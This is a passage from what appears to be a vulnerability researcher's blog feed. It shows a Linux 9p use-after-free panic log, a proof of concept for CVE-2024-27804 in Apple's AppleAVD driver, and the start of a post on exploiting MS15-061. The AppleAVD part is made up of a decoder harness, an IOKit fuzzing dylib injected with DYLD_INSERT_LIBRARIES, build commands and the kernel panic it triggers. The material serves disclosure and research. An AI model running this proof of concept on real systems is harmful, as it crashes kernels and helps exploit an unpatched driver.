<span class="o">[</span>   17.037164] page dumped because: kasan: bad access detected

<span class="o">[</span>   17.037830] Memory state around the buggy address:
<span class="o">[</span>   17.038281]  ffff88810590ac00: fa fb fb fb fb fb fb fb fb fb fb fb <span class="nb">fc fc fc fc</span>
<span class="o">[</span>   17.038925]  ffff88810590ac80: fa fb fb fb fb fb fb fb fb fb fb fb <span class="nb">fc fc fc fc</span>
<span class="o">[</span>   17.039756] <span class="o">&gt;</span>ffff88810590ad00: fa fb fb fb fb fb fb fb fb fb fb fb <span class="nb">fc fc fc fc</span>
<span class="o">[</span>   17.040437]                    ^
<span class="o">[</span>   17.040735]  ffff88810590ad80: <span class="nb">fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc</span>
<span class="o">[</span>   17.041420]  ffff88810590ae00: <span class="nb">fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc</span>
<span class="o">[</span>   17.042213] <span class="o">==================================================================</span>
<span class="o">[</span>   17.042872] Disabling lock debugging due to kernel taint
<span class="o">[</span>   17.043615] general protection fault, probably <span class="k">for </span>non-canonical address 0xe0000be7b1d87003: 0000 <span class="o">[</span><span class="c">#1] PREEMPT SMP KASAN NOPTI</span>
<span class="o">[</span>   17.044955] KASAN: probably user-memory-access <span class="k">in </span>range <span class="o">[</span>0x00007f3d8ec38018-0x00007f3d8ec3801f]
<span class="o">[</span>   17.045905] CPU: 2 PID: 151 Comm: 9poc Tainted: G    B   W          6.8.0 <span class="c">#83</span>
<span class="o">[</span>   17.046762] Hardware name: QEMU Standard PC <span class="o">(</span>i440FX + PIIX, 1996<span class="o">)</span>, BIOS 1.15.0-1 04/01/2014
<span class="o">[</span>   17.047749] RIP: 0010:p9_client_rpc+0xe2/0x940
<span class="o">[</span>   17.048310] Code: e8 03 80 3c 10 00 0f 85 d0 07 00 00 48 8b 44 24 30 4c 8b 68 48 48 b8 00 00 00 00 00 <span class="nb">fc </span>ff <span class="nb">df </span>49 8d 7d 1c 48 89 fa 48 c1 ea 03 &lt;0f&gt; b6 04 02 48 89 fa 83 e2 07 38 d0 7f 08 84 c0 0f 85 92 07 00 00
<span class="o">[</span>   17.049932] RSP: 0018:ffff88810634fb08 EFLAGS: 00010216
<span class="o">[</span>   17.050497] RAX: dffffc0000000000 RBX: 0000000000000018 RCX: ffffffff8413d4de
<span class="o">[</span>   17.051172] RDX: 00000fe7b1d87003 RSI: 0000000000000008 RDI: 00007f3d8ec3801b
<span class="o">[</span>   17.052007] RBP: ffff88810634fc78 R08: 0000000000003fff R09: fffffbfff0e04828
<span class="o">[</span>   17.052845] R10: ffffffff87024147 R11: 0000000000000001 R12: ffffffff84c13220
<span class="o">[</span>   17.053656] R13: 00007f3d8ec37fff R14: ffff8881005e4da0 R15: ffff888114003980
<span class="o">[</span>   17.054464] FS:  00007f3d8fc39640<span class="o">(</span>0000<span class="o">)</span> GS:ffff8881f6f00000<span class="o">(</span>0000<span class="o">)</span> knlGS:0000000000000000
<span class="o">[</span>   17.055413] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
<span class="o">[</span>   17.056081] CR2: 00007f3d80000020 CR3: 0000000112f4c000 CR4: 0000000000350ef0
<span class="o">[</span>   17.056930] Call Trace:
<span class="o">[</span>   17.057238]  &lt;TASK&gt;
<span class="o">[</span>   17.057532]  ? die_addr+0x3c/0xa0
<span class="o">[</span>   17.057981]  ? exc_general_protection+0x149/0x220
<span class="o">[</span>   17.058556]  ? asm_exc_general_protection+0x26/0x30
<span class="o">[</span>   17.059206]  ? p9_client_rpc+0x89e/0x940
<span class="o">[</span>   17.059654]  ? p9_client_rpc+0xe2/0x940
<span class="o">[</span>   17.060134]  ? p9_client_rpc+0x89e/0x940
<span class="o">[</span>   17.060637]  ? __pfx_p9_client_rpc+0x10/0x10
<span class="o">[</span>   17.061158]  ? add_taint+0x55/0x90
<span class="o">[</span>   17.061540]  ? srso_return_thunk+0x5/0x5f
<span class="o">[</span>   17.062038]  ? add_taint+0x25/0x90
<span class="o">[</span>   17.062455]  ? srso_return_thunk+0x5/0x5f
<span class="o">[</span>   17.062948]  ? end_report+0x7e/0x130
<span class="o">[</span>   17.063376]  ? srso_return_thunk+0x5/0x5f
<span class="o">[</span>   17.063884]  ? p9_client_getattr_dotl+0x170/0x190
<span class="o">[</span>   17.064450]  p9_client_getattr_dotl+0xb0/0x190
<span class="o">[</span>   17.065000]  v9fs_vfs_getattr_dotl+0x115/0x370
<span class="o">[</span>   17.065523]  vfs_statx+0x100/0x460
<span class="o">[</span>   17.065911]  ? __pfx_vfs_statx+0x10/0x10
<span class="o">[</span>   17.066374]  ? srso_return_thunk+0x5/0x5f
<span class="o">[</span>   17.066879]  ? getname_flags.part.0+0xb4/0x450
<span class="o">[</span>   17.067424]  vfs_fstatat+0x8e/0xc0
<span class="o">[</span>   17.067897]  __do_sys_newfstatat+0x6b/0xc0
<span class="o">[</span>   17.068371]  ? __pfx___do_sys_newfstatat+0x10/0x10
<span class="o">[</span>   17.068961]  ? srso_return_thunk+0x5/0x5f
<span class="o">[</span>   17.069398]  ? lockdep_hardirqs_on_prepare+0x277/0x410
<span class="o">[</span>   17.069878]  do_syscall_64+0xcc/0x1e0
<span class="o">[</span>   17.070329]  entry_SYSCALL_64_after_hwframe+0x6f/0x77
<span class="o">[</span>   17.070903] RIP: 0033:0x7f3d8fd50d3e
<span class="o">[</span>   17.071370] Code: 48 89 f2 b9 00 01 00 00 48 89 fe bf 9c ff ff ff e9 07 00 00 00 0f 1f 80 00 00 00 00 f3 0f 1e fa 41 89 ca b8 06 01 00 00 0f 05 &lt;3d&gt; 00 f0 ff ff 77 0b 31 c0 c3 0f 1f 84 00 00 00 00 00 48 8b 15 b9
<span class="o">[</span>   17.073026] RSP: 002b:00007f3d8fc38d78 EFLAGS: 00000213 ORIG_RAX: 0000000000000106
<span class="o">[</span>   17.073783] RAX: ffffffffffffffda RBX: 00007f3d8fc39640 RCX: 00007f3d8fd50d3e
<span class="o">[</span>   17.074440] RDX: 00007f3d8fc38db0 RSI: 00005559d64e1011 RDI: 0000000000000003
<span class="o">[</span>   17.075263] RBP: 00007f3d8fc38e50 R08: 00007f3d80000b70 R09: 0000000000000001
<span class="o">[</span>   17.076061] R10: 0000000000000000 R11: 0000000000000213 R12: 00007f3d8fc39640
<span class="o">[</span>   17.076893] R13: 0000000000000000 R14: 00007f3d8fcd17d0 R15: 00007fff30463de0
<span class="o">[</span>   17.077665]  &lt;/TASK&gt;
<span class="o">[</span>   17.077960] Modules linked <span class="k">in</span>:
<span class="o">[</span>   17.078409] <span class="nt">---</span><span class="o">[</span> end trace 0000000000000000 <span class="o">]</span><span class="nt">---</span>
<span class="o">[</span>   17.078857] RIP: 0010:p9_client_rpc+0xe2/0x940
<span class="o">[</span>   17.079272] Code: e8 03 80 3c 10 00 0f 85 d0 07 00 00 48 8b 44 24 30 4c 8b 68 48 48 b8 00 00 00 00 00 <span class="nb">fc </span>ff <span class="nb">df </span>49 8d 7d 1c 48 89 fa 48 c1 ea 03 &lt;0f&gt; b6 04 02 48 89 fa 83 e2 07 38 d0 7f 08 84 c0 0f 85 92 07 00 00
<span class="o">[</span>   17.081015] RSP: 0018:ffff88810634fb08 EFLAGS: 00010216
<span class="o">[</span>   17.081545] RAX: dffffc0000000000 RBX: 0000000000000018 RCX: ffffffff8413d4de
<span class="o">[</span>   17.082185] RDX: 00000fe7b1d87003 RSI: 0000000000000008 RDI: 00007f3d8ec3801b
<span class="o">[</span>   17.082876] RBP: ffff88810634fc78 R08: 0000000000003fff R09: fffffbfff0e04828
<span class="o">[</span>   17.083638] R10: ffffffff87024147 R11: 0000000000000001 R12: ffffffff84c13220
<span class="o">[</span>   17.084325] R13: 00007f3d8ec37fff R14: ffff8881005e4da0 R15: ffff888114003980
<span class="o">[</span>   17.085059] FS:  00007f3d8fc39640<span class="o">(</span>0000<span class="o">)</span> GS:ffff8881f6f00000<span class="o">(</span>0000<span class="o">)</span> knlGS:0000000000000000
<span class="o">[</span>   17.085838] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
<span class="o">[</span>   17.086447] CR2: 00007f3d80000020 CR3: 0000000112f4c000 CR4: 0000000000350ef0</code></pre></figure>]]></content><author><name></name></author><category term="fuzzing" /><summary type="html"><![CDATA[During our recent fuzzing efforts on various subsystems of the Linux kernel, we encountered a kernel panic. Interestingly, the kernel panic that exposed the vulnerability was not directly related to the input seed generated by our fuzzer. Instead, it was the fuzzer’s activity itself that inadvertently triggered the bug. Although the initial sample generated by the fuzzer didn’t provide a direct proof of concept (PoC), a thorough analysis of the panic log enabled us to develop a PoC for the vulnerability. The vulnerability in the 9p file system is a race condition that leads to a use-after-free.]]></summary></entry><entry><title type="html">CVE-2024-27804 Vulnerability in AppleAVD</title><link href="http://0.0.0.0:4000/fuzzing/2024/05/14/anotherappleavd.html" rel="alternate" type="text/html" title="CVE-2024-27804 Vulnerability in AppleAVD" /><published>2024-05-14T09:01:01+09:00</published><updated>2024-05-14T09:01:01+09:00</updated><id>http://0.0.0.0:4000/fuzzing/2024/05/14/anotherappleavd</id><content type="html" xml:base="http://0.0.0.0:4000/fuzzing/2024/05/14/anotherappleavd.html"><![CDATA[<p><a href="https://github.com/R00tkitSMM/CVE-2024-27804">https://github.com/R00tkitSMM/CVE-2024-27804</a></p>

<p>tested on M1</p>

<figure class="highlight"><pre><code class="language-shell" data-lang="shell">// vtdecode.m 
<span class="c">#include &lt;dlfcn.h&gt;</span>
<span class="c">#include &lt;stdio.h&gt;</span>
<span class="c">#import &lt;AVFoundation/AVFoundation.h&gt;</span>

typedef void <span class="o">(</span><span class="k">*</span>t_VTApplyRestrictions<span class="o">)(</span>int arg<span class="o">)</span><span class="p">;</span>
t_VTApplyRestrictions VTApplyRestrictions<span class="p">;</span>

int __attribute__<span class="o">((</span>noinline<span class="o">))</span> fuzz<span class="o">(</span>const char <span class="k">*</span>filename<span class="o">)</span> <span class="o">{</span>
  @autoreleasepool <span class="o">{</span>
    NSError <span class="k">*</span>error <span class="o">=</span> nil<span class="p">;</span>
    NSURL <span class="k">*</span>fileURL <span class="o">=</span> <span class="o">[</span>NSURL
        fileURLWithPath:[NSString stringWithCString:filename
                                           encoding:NSASCIIStringEncoding]]<span class="p">;</span>
    AVAsset <span class="k">*</span>asset <span class="o">=</span> <span class="o">[</span>AVAsset assetWithURL:fileURL]<span class="p">;</span>
    <span class="k">if</span> <span class="o">(</span>asset <span class="o">==</span> nil<span class="o">)</span>
      <span class="k">return </span>0<span class="p">;</span>

    AVAssetReader <span class="k">*</span>reader <span class="o">=</span> <span class="o">[[</span>AVAssetReader alloc] initWithAsset:asset
                                                           error:&amp;error]<span class="p">;</span>
    <span class="k">if</span> <span class="o">(</span>reader <span class="o">==</span> nil<span class="o">)</span>
      <span class="k">return </span>0<span class="p">;</span>

    NSArray <span class="k">*</span>tracks <span class="o">=</span> <span class="o">[</span>asset tracksWithMediaType:AVMediaTypeVideo]<span class="p">;</span>
    <span class="k">if</span> <span class="o">(</span>tracks <span class="o">==</span> nil <span class="o">||</span> <span class="o">([</span>tracks count] <span class="o">==</span> 0<span class="o">))</span>
      <span class="k">return </span>0<span class="p">;</span>

    AVAssetTrack <span class="k">*</span>track <span class="o">=</span> tracks[0]<span class="p">;</span>

    NSDictionary <span class="k">*</span>outputSettings <span class="o">=</span> <span class="o">[</span>NSDictionary
        dictionaryWithObject:[NSNumber numberWithInt:kCMPixelFormat_32BGRA]
                      forKey:<span class="o">(</span><span class="nb">id</span><span class="o">)</span>kCVPixelBufferPixelFormatTypeKey]<span class="p">;</span>
    AVAssetReaderTrackOutput <span class="k">*</span>output <span class="o">=</span> <span class="o">[</span>AVAssetReaderTrackOutput
        assetReaderTrackOutputWithTrack:track
                         outputSettings:outputSettings]<span class="p">;</span>

    <span class="o">[</span>reader addOutput:output]<span class="p">;</span>
    <span class="o">[</span>reader startReading]<span class="p">;</span>

    <span class="k">for</span> <span class="o">(</span>int frame <span class="o">=</span> 0<span class="p">;</span> frame &lt; 2<span class="p">;</span> frame++<span class="o">)</span> <span class="o">{</span>
      // <span class="nb">printf</span><span class="o">(</span><span class="s2">"Frame %d</span><span class="se">\n</span><span class="s2">"</span>, frame<span class="o">)</span><span class="p">;</span>

      CMSampleBufferRef sampleBuffer <span class="o">=</span> <span class="o">[</span>output copyNextSampleBuffer]<span class="p">;</span>
      <span class="k">if</span> <span class="o">(</span>sampleBuffer <span class="o">==</span> nil<span class="o">)</span>
        <span class="nb">break</span><span class="p">;</span>

      CMSampleBufferInvalidate<span class="o">(</span>sampleBuffer<span class="o">)</span><span class="p">;</span>
      CFRelease<span class="o">(</span>sampleBuffer<span class="o">)</span><span class="p">;</span>
      sampleBuffer <span class="o">=</span> NULL<span class="p">;</span>
    <span class="o">}</span>
  <span class="o">}</span>

  <span class="k">return </span>1<span class="p">;</span>
<span class="o">}</span>

int main<span class="o">(</span>int argc, const char <span class="k">*</span>argv[]<span class="o">)</span> <span class="o">{</span>
  <span class="k">if</span> <span class="o">(</span>argc &lt; 2<span class="o">)</span> <span class="o">{</span>
    <span class="nb">printf</span><span class="o">(</span><span class="s2">"Usage: %s &lt;filename&gt;</span><span class="se">\n</span><span class="s2">"</span>, argv[0]<span class="o">)</span><span class="p">;</span>
    <span class="k">return </span>0<span class="p">;</span>
  <span class="o">}</span>

  // make decoding run <span class="k">in </span>the current process instead of VTDecoderXPCService
  void <span class="k">*</span>toolbox <span class="o">=</span> dlopen<span class="o">(</span><span class="s2">"/System/Library/Frameworks/VideoToolbox.framework/"</span>
                         <span class="s2">"Versions/A/VideoToolbox"</span>,
                         RTLD_NOW<span class="o">)</span><span class="p">;</span>
  <span class="k">if</span> <span class="o">(!</span>toolbox<span class="o">)</span> <span class="o">{</span>
    <span class="nb">printf</span><span class="o">(</span><span class="s2">"Error loading library</span><span class="se">\n</span><span class="s2">"</span><span class="o">)</span><span class="p">;</span>
    <span class="k">return </span>0<span class="p">;</span>
  <span class="o">}</span>
  VTApplyRestrictions <span class="o">=</span>
      <span class="o">(</span>t_VTApplyRestrictions<span class="o">)</span>dlsym<span class="o">(</span>toolbox, <span class="s2">"VTApplyRestrictions"</span><span class="o">)</span><span class="p">;</span>
  <span class="k">if</span> <span class="o">(!</span>VTApplyRestrictions<span class="o">)</span> <span class="o">{</span>
    <span class="nb">printf</span><span class="o">(</span><span class="s2">"Error finding VTApplyRestrictions symbol</span><span class="se">\n</span><span class="s2">"</span><span class="o">)</span><span class="p">;</span>
    <span class="k">return </span>0<span class="p">;</span>
  <span class="o">}</span>
  VTApplyRestrictions<span class="o">(</span>1<span class="o">)</span><span class="p">;</span>

  fuzz<span class="o">(</span>argv[1]<span class="o">)</span><span class="p">;</span>

  <span class="k">return </span>0<span class="p">;</span>
<span class="o">}</span></code></pre></figure>

<figure class="highlight"><pre><code class="language-cpp" data-lang="cpp"><span class="c1">// flip.c</span>
<span class="cp">#include</span> <span class="cpf">&lt;IOKit/IOKitLib.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;dlfcn.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;execinfo.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdint.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;sys/sysctl.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;time.h&gt;</span><span class="cp">
</span>
<span class="kt">void</span> <span class="nf">flip_bit</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">len</span><span class="p">)</span> <span class="p">{</span>

  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">len</span><span class="p">)</span>
    <span class="k">return</span><span class="p">;</span>
  <span class="kt">size_t</span> <span class="n">offset</span> <span class="o">=</span> <span class="n">rand</span><span class="p">()</span> <span class="o">%</span> <span class="n">len</span><span class="p">;</span>

  <span class="p">((</span><span class="kt">int</span> <span class="o">*</span><span class="p">)</span><span class="n">buf</span><span class="p">)[</span><span class="n">offset</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x41414141</span><span class="p">;</span>
<span class="p">}</span>

<span class="n">kern_return_t</span> <span class="n">fake_IOConnectCallMethod</span><span class="p">(</span><span class="n">mach_port_t</span> <span class="n">connection</span><span class="p">,</span>
                                       <span class="kt">uint32_t</span> <span class="n">selector</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="o">*</span><span class="n">input</span><span class="p">,</span>
                                       <span class="kt">uint32_t</span> <span class="n">inputCnt</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">inputStruct</span><span class="p">,</span>
                                       <span class="kt">size_t</span> <span class="n">inputStructCnt</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="o">*</span><span class="n">output</span><span class="p">,</span>
                                       <span class="kt">uint32_t</span> <span class="o">*</span><span class="n">outputCnt</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">outputStruct</span><span class="p">,</span>
                                       <span class="kt">size_t</span> <span class="o">*</span><span class="n">outputStructCntP</span><span class="p">)</span> <span class="p">{</span>

  <span class="n">flip_bit</span><span class="p">(</span><span class="n">inputStruct</span><span class="p">,</span> <span class="n">inputStructCnt</span><span class="p">);</span>

  <span class="k">return</span> <span class="n">IOConnectCallMethod</span><span class="p">(</span><span class="n">connection</span><span class="p">,</span> <span class="n">selector</span><span class="p">,</span> <span class="n">input</span><span class="p">,</span> <span class="n">inputCnt</span><span class="p">,</span> <span class="n">inputStruct</span><span class="p">,</span>
                             <span class="n">inputStructCnt</span><span class="p">,</span> <span class="n">output</span><span class="p">,</span> <span class="n">outputCnt</span><span class="p">,</span> <span class="n">outputStruct</span><span class="p">,</span>
                             <span class="n">outputStructCntP</span><span class="p">);</span>
<span class="p">}</span>

<span class="k">typedef</span> <span class="k">struct</span> <span class="nc">interposer</span> <span class="p">{</span>
  <span class="kt">void</span> <span class="o">*</span><span class="n">replacement</span><span class="p">;</span>
  <span class="kt">void</span> <span class="o">*</span><span class="n">original</span><span class="p">;</span>
<span class="p">}</span> <span class="n">interpose_t</span><span class="p">;</span>

<span class="n">__attribute__</span><span class="p">((</span><span class="n">used</span><span class="p">))</span> <span class="k">static</span> <span class="k">const</span> <span class="n">interpose_t</span> <span class="n">interposers</span><span class="p">[]</span>
    <span class="n">__attribute__</span><span class="p">((</span><span class="n">section</span><span class="p">(</span><span class="s">"__DATA,__interpose"</span><span class="p">)))</span> <span class="o">=</span> <span class="p">{</span>
        <span class="p">{.</span><span class="n">replacement</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">fake_IOConnectCallMethod</span><span class="p">,</span>
         <span class="p">.</span><span class="n">original</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">IOConnectCallMethod</span><span class="p">}};</span></code></pre></figure>

<figure class="highlight"><pre><code class="language-shell" data-lang="shell">clang <span class="nt">-arch</span> arm64 <span class="nt">-o</span> vtdecode vtdecode.m <span class="nt">-framework</span> VideoToolbox <span class="nt">-framework</span> Foundation <span class="nt">-framework</span> CoreMedia  <span class="nt">-framework</span> CoreVideo <span class="nt">-framework</span>  AVFoundation
clang <span class="nt">-dynamiclib</span> <span class="nt">-o</span> flip.dylib flip.c <span class="nt">-framework</span> IOKit</code></pre></figure>

<figure class="highlight"><pre><code class="language-shell" data-lang="shell"><span class="nv">DYLD_INSERT_LIBRARIES</span><span class="o">=</span>./flip.dylib ./vtdecode input_poc/orientation-normal-fragmented.mp4.mov</code></pre></figure>

<figure class="highlight"><pre><code class="language-shell" data-lang="shell">panic<span class="o">(</span>cpu 4 <span class="nb">caller </span>0xfffffe0026851cdc<span class="o">)</span>: Unaligned kernel data abort. at pc 0xfffffe0026aed514, lr 0xfffffe0026aed5d8 <span class="o">(</span>saved state: 0xfffffe3a396e3200<span class="o">)</span>
	  x0:  0x000000000000000e x1:  0xfffffe1002bdc01b  x2:  0x0000000000000000  x3:  0xfffffe3a396e3444
	  x4:  0xfffffe3a396e344c x5:  0x000000000002d1f4  x6:  0x0000000000000000  x7:  0xffffffffffffffff
	  x8:  0x0000000000000004 x9:  0xfffffe1002bdc01f  x10: 0x0000000000000000  x11: 0x0000000000000002
	  x12: 0x0000000000000004 x13: 0x0000000000000000  x14: 0x0000000000000000  x15: 0x0000000000000000
	  x16: 0xfffffe0026aeda90 x17: 0xfffffe0026aed9fc  x18: 0x0000000000000000  x19: 0xfffffe1b40e90000
	  x20: 0x0000000000000000 x21: 0x0000000000000000  x22: 0xfffffe1002bdc000  x23: 0x0000000000000001
	  x24: 0x0000000000000000 x25: 0xfffffe1002bdc024  x26: 0x000000000000001b  x27: 0x00000000000008b0
	  x28: 0x000000000000001b fp:  0xfffffe3a396e3610  lr:  0xfffffe0026aed5d8  sp:  0xfffffe3a396e3550
	  pc:  0xfffffe0026aed514 cpsr: 0x60401208         esr: 0x96000021          far: 0xfffffe1002bdc01b

Debugger message: panic
Memory ID: 0x6
OS release <span class="nb">type</span>: User
OS version: 23C71
Kernel version: Darwin Kernel Version 23.2.0: Wed Nov 15 21:53:34 PST 2023<span class="p">;</span> root:xnu-10002.61.3~2/RELEASE_ARM64_T8103
Fileset Kernelcache UUID: 6DAC2CF8E68E8F436296A697E29AAD44
Kernel UUID: E245D804-1FA3-31E2-90BC-B4DF75B2129E
Boot session UUID: 52885412-0864-4DFF-8E9E-36C3C7BC8B88
iBoot version: iBoot-10151.61.4
secure boot?: YES
roots installed: 0
Paniclog version: 14
KernelCache slide: 0x000000001dac4000
KernelCache base:  0xfffffe0024ac8000
Kernel slide:      0x000000001dacc000
Kernel text base:  0xfffffe0024ad0000
Kernel text <span class="nb">exec </span>slide: 0x000000001efd8000
Kernel text <span class="nb">exec </span>base:  0xfffffe0025fdc000
mach_absolute_time: 0x1c4f4c5a5
Epoch Time:        sec       usec
  Boot    : 0x65a56518 0x000b7c0f
  Sleep   : 0x00000000 0x00000000
  Wake    : 0x00000000 0x00000000
  Calendar: 0x65a5664f 0x00072ae4

Zone info:
  Zone map: 0xfffffe100f2dc000 - 0xfffffe300f2dc000
  <span class="nb">.</span> VM    : 0xfffffe100f2dc000 - 0xfffffe14dbfa8000
  <span class="nb">.</span> RO    : 0xfffffe14dbfa8000 - 0xfffffe1675940000
  <span class="nb">.</span> GEN0  : 0xfffffe1675940000 - 0xfffffe1b4260c000
  <span class="nb">.</span> GEN1  : 0xfffffe1b4260c000 - 0xfffffe200f2d8000
  <span class="nb">.</span> GEN2  : 0xfffffe200f2d8000 - 0xfffffe24dbfa4000
  <span class="nb">.</span> GEN3  : 0xfffffe24dbfa4000 - 0xfffffe29a8c70000
  <span class="nb">.</span> DATA  : 0xfffffe29a8c70000 - 0xfffffe300f2dc000
  Metadata: 0xfffffe3a1c3ac000 - 0xfffffe3a243ac000
  Bitmaps : 0xfffffe3a243ac000 - 0xfffffe3a27194000
  Extra   : 0 - 0

CORE 0 recently retired instr at 0xfffffe00261886e4
CORE 1 recently retired instr at 0xfffffe00261886e4
CORE 2 recently retired instr at 0xfffffe00261886e4
CORE 3 recently retired instr at 0xfffffe00261886e4
CORE 4 recently retired instr at 0xfffffe0026186ee8
CORE 5 recently retired instr at 0xfffffe00261886e4
CORE 6 recently retired instr at 0xfffffe00261886e4
CORE 7 recently retired instr at 0xfffffe00261886e4
TPIDRx_ELy <span class="o">=</span> <span class="o">{</span>1: 0xfffffe1b448bd030  0: 0x0000000000001004  0ro: 0x000000010061c320 <span class="o">}</span>
CORE 0 PVH locks held: None
CORE 1 PVH locks held: None
CORE 2 PVH locks held: None
CORE 3 PVH locks held: None
CORE 4 PVH locks held: None
CORE 5 PVH locks held: None
CORE 6 PVH locks held: None
CORE 7 PVH locks held: None
CORE 0: <span class="nv">PC</span><span class="o">=</span>0xfffffe002606ff30, <span class="nv">LR</span><span class="o">=</span>0xfffffe002606ff30, <span class="nv">FP</span><span class="o">=</span>0xfffffe3a39a13ef0
CORE 1: <span class="nv">PC</span><span class="o">=</span>0xfffffe002606ff30, <span class="nv">LR</span><span class="o">=</span>0xfffffe002606ff30, <span class="nv">FP</span><span class="o">=</span>0xfffffe3a392b7ef0
CORE 2: <span class="nv">PC</span><span class="o">=</span>0xfffffe002606ff30, <span class="nv">LR</span><span class="o">=</span>0xfffffe002606ff30, <span class="nv">FP</span><span class="o">=</span>0xfffffe3a37df7ef0
CORE 3: <span class="nv">PC</span><span class="o">=</span>0xfffffe002606ff30, <span class="nv">LR</span><span class="o">=</span>0xfffffe002606ff30, <span class="nv">FP</span><span class="o">=</span>0xfffffe3a37c8fef0
CORE 4 is the one that panicked. Check the full backtrace <span class="k">for </span>details.
CORE 5: <span class="nv">PC</span><span class="o">=</span>0xfffffe002606ff34, <span class="nv">LR</span><span class="o">=</span>0xfffffe002606ff30, <span class="nv">FP</span><span class="o">=</span>0xfffffe3a39033ef0
CORE 6: <span class="nv">PC</span><span class="o">=</span>0xfffffe002606ff34, <span class="nv">LR</span><span class="o">=</span>0xfffffe002606ff30, <span class="nv">FP</span><span class="o">=</span>0xfffffe3a39893ef0
CORE 7: <span class="nv">PC</span><span class="o">=</span>0xfffffe002606ff34, <span class="nv">LR</span><span class="o">=</span>0xfffffe002606ff30, <span class="nv">FP</span><span class="o">=</span>0xfffffe3a396a7ef0
Compressor Info: 3% of compressed pages limit <span class="o">(</span>OK<span class="o">)</span> and 2% of segments limit <span class="o">(</span>OK<span class="o">)</span> with 0 swapfiles and OK swap space
Panicked task 0xfffffe1b46695e18: 14298 pages, 13 threads: pid 2352: vtdecode
Panicked thread: 0xfffffe1b448bd030, backtrace: 0xfffffe3a396e2930, tid: 184820
		  lr: 0xfffffe0026035568  fp: 0xfffffe3a396e29c0
		  lr: 0xfffffe002617fa24  fp: 0xfffffe3a396e2a30
		  lr: 0xfffffe002617de84  fp: 0xfffffe3a396e2b20
		  lr: 0xfffffe0025fe3b68  fp: 0xfffffe3a396e2b30
		  lr: 0xfffffe0026034e48  fp: 0xfffffe3a396e2ee0
		  lr: 0xfffffe002684726c  fp: 0xfffffe3a396e2f00
		  lr: 0xfffffe0026851cdc  fp: 0xfffffe3a396e3080
		  lr: 0xfffffe002617f890  fp: 0xfffffe3a396e30f0
		  lr: 0xfffffe002617e138  fp: 0xfffffe3a396e31e0
		  lr: 0xfffffe0025fe3b68  fp: 0xfffffe3a396e31f0
		  lr: 0xfffffe0026aed5d8  fp: 0xfffffe3a396e3610
		  lr: 0xfffffe0026ad6fe4  fp: 0xfffffe3a396e3720
		  lr: 0xfffffe0026ad66b4  fp: 0xfffffe3a396e3790
		  lr: 0xfffffe0026ad4e48  fp: 0xfffffe3a396e37d0
		  lr: 0xfffffe00267a0168  fp: 0xfffffe3a396e3810
		  lr: 0xfffffe00267a0484  fp: 0xfffffe3a396e39a0
		  lr: 0xfffffe002614b294  fp: 0xfffffe3a396e3ac0
		  lr: 0xfffffe002603bce8  fp: 0xfffffe3a396e3b60
		  lr: 0xfffffe002600edd4  fp: 0xfffffe3a396e3bc0
		  lr: 0xfffffe00260273f8  fp: 0xfffffe3a396e3c60
		  lr: 0xfffffe0026027864  fp: 0xfffffe3a396e3d50
		  lr: 0xfffffe0026173698  fp: 0xfffffe3a396e3e20
		  lr: 0xfffffe002617e18c  fp: 0xfffffe3a396e3f10
		  lr: 0xfffffe0025fe3b68  fp: 0xfffffe3a396e3f20
      Kernel Extensions <span class="k">in </span>backtrace:
         com.apple.driver.AppleAVD<span class="o">(</span>737.1<span class="o">)[</span>63D957B3-2E48-36EA-880C-6F0BE3DE16A6]@0xfffffe0026a37e00-&gt;0xfffffe0026b04b43
            dependency: com.apple.driver.AppleARMPlatform<span class="o">(</span>1.0.2<span class="o">)[</span>9FC0A536-5BC6-33D5-911A-5A46BDDBBCEF]@0xfffffe00269dfe20-&gt;0xfffffe0026a3295b
            dependency: com.apple.driver.FairPlayIOKit<span class="o">(</span>71.3.0<span class="o">)[</span>AD212727-D14F-3DA2-8974-6CEA43B45BC1]@0xfffffe0027e23b50-&gt;0xfffffe0027f19aef
            dependency: com.apple.iokit.CoreAnalyticsFamily<span class="o">(</span>1<span class="o">)[</span>0896C7D3-89F2-3D56-A301-5CB0FE0BBEAC]@0xfffffe0027cb1f60-&gt;0xfffffe0027cb9d4b
            dependency: com.apple.iokit.IOSurface<span class="o">(</span>352.0.3<span class="o">)[</span>0351AFC2-D85C-3BB5-B9C6-C8C0F6C7A01D]@0xfffffe00288a7dc0-&gt;0xfffffe00288d85ab</code></pre></figure>]]></content><author><name></name></author><category term="fuzzing" /><summary type="html"><![CDATA[https://github.com/R00tkitSMM/CVE-2024-27804]]></summary></entry><entry><title type="html">Exploiting MS15-061 with reverse engineering Win32k.sys</title><link href="http://0.0.0.0:4000/fuzzing/2024/04/01/explitingwind32k.html" rel="alternate" type="text/html" title="Exploiting MS15-061 with reverse engineering Win32k.sys" /><published>2024-04-01T09:27:59+09:00</published><updated>2024-04-01T09:27:59+09:00</updated><id>http://0.0.0.0:4000/fuzzing/2024/04/01/explitingwind32k</id><content type="html" xml:base="http://0.0.0.0:4000/fuzzing/2024/04/01/explitingwind32k.html"><![CDATA[<p>MS15-061 is a Use After Free vulnerability in Windows Kernel. A malicious application can exploit it be able to execute arbitrary code with kernel privileges.</p>

